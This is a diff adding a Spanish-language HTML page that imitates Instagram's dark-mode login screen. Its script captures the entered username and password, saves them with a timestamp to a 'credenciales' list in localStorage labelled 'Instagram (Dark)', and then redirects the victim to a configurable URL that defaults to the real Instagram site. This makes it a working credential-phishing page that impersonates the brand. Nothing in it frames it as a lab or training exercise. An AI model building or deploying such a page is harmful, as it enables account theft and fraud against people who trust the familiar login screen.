@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #e0e0e0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        main {
+            display: flex;
+            flex-grow: 1;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            max-width: 935px;
+            width: 100%;
+        }
+
+        .left-pane {
+            background-image: url('instagram-bg.png'); /* Asegúrate de que este archivo exista */
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            height: 600px;
+            flex-basis: 450px;
+            margin-right: 32px;
+        }
+
+        .right-pane {
+            display: flex;
+            flex-direction: column;
+            flex-basis: 350px;
+        }
+
+        .login-box, .signup-box {
+            background-color: #000;
+            border: none; /* ¡Recuadro eliminado! */
+            padding: 20px 40px;
+            text-align: center;
+        }
+
+        .login-box {
+            /* Se agrega un borde sutil solo para que coincida con el original si es necesario, pero lo quitamos según tu solicitud */
+        }
+        
+        .logo {
+            width: 175px;
+            margin: 36px auto 12px;
+            filter: invert(1);
+        }
+
+        form { display: flex; flex-direction: column; }
+
+        input {
+            background-color: rgb(30, 30, 30);
+            border: 1px solid rgb(54, 54, 54);
+            color: #fff;
+            border-radius: 6px;
+            padding: 10px;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        input::placeholder { color: rgb(168, 168, 168); }
+
+        .login-btn {
+            background-color: #475993; /* Tono azul oscuro/púrpura */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 9px;
+            margin-top: 16px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: rgb(168, 168, 168);
+            font-weight: bold;
+            font-size: 13px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid rgb(54, 54, 54);
+        }
+        .divider:not(:empty)::before { margin-right: .5em; }
+        .divider:not(:empty)::after { margin-left: .5em; }
+
+        .facebook-login {
+            color: #0095f6;
+            font-weight: bold;
+            text-decoration: none;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        /* Estilo aplicado directamente al SVG */
+        .facebook-login svg {
+            margin-right: 8px;
+        }
+
+        .forgot-password {
+            color: #0095f6;
+            font-size: 12px;
+            margin-top: 20px;
+            text-decoration: none;
+        }
+        
+        .signup-box {
+            margin-top: 10px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: rgb(168, 168, 168);
+        }
+        footer a { color: rgb(168, 168, 168); text-decoration: none; margin: 0 8px; }
+
+        @media (max-width: 875px) {
+            .left-pane { display: none; }
+            main { justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <div class="left-pane"></div>
+        <div class="right-pane">
+            <div class="login-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" class="logo" alt="Instagram">
+                <form onsubmit="handleLogin(); return false;">
+                    <input type="text" id="emailInput" placeholder="Teléfono, usuario o correo electrónico" required>
+                    <input type="password" id="passwordInput" placeholder="Contraseña" required>
+                    <button type="submit" class="login-btn">Iniciar sesión</button>
+                </form>
+                <div class="divider">O</div>
+                <a href="#" class="facebook-login">
+                    <!-- ¡LOGO DE FACEBOOK EN SVG, GARANTIZADO PARA VERSE! -->
+                    <svg fill="#0095f6" height="16" width="16" viewBox="0 0 24 24">
+                        <path d="M13.5 22.5a9 9 0 1 0 0-18 9 9 0 0 0 0 18Z"></path>
+                        <path fill="#fff" d="M15.6 12.6h-2.1v6.9h-3v-6.9H9v-2.7h1.5v-2c0-1.1.5-2.4 2.6-2.4h2.2v2.7h-1.6c-.6 0-.7.3-.7.7v1.4h2.3l-.3 2.7Z"></path>
+                    </svg>
+                    <span>Iniciar sesión con Facebook</span>
+                </a>
+                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+            </div>
+            <div class="signup-box">
+                <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div>
+            <a href="#">Meta</a><a href="#">Información</a><a href="#">Blog</a><a href="#">Empleo</a><a href="#">Ayuda</a><a href="#">API</a><a href="#">Privacidad</a><a href="#">Condiciones</a><a href="#">Ubicaciones</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
+        </div>
+        <div>
+            <span>Español</span>
+            <span>© 2025 Instagram from Meta</span>
+        </div>
+    </footer>
+    <script>
+        function handleLogin() {
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+            if (!email || !password) return;
+
+            const credenciales = JSON.parse(localStorage.getItem('credenciales') || '[]');
+            credenciales.push({
+                origen: 'Instagram (Dark)',
+                usuario: email,
+                contrasena: password,
+                fecha: new Date().toLocaleString('es-ES')
+            });
+            localStorage.setItem('credenciales', JSON.stringify(credenciales));
+            
+            const redirectUrl = localStorage.getItem('instagramRedirectUrl') || 'https://www.instagram.com';
+            window.location.href = redirectUrl;
+        }
+    </script>
+</body>
+</html>
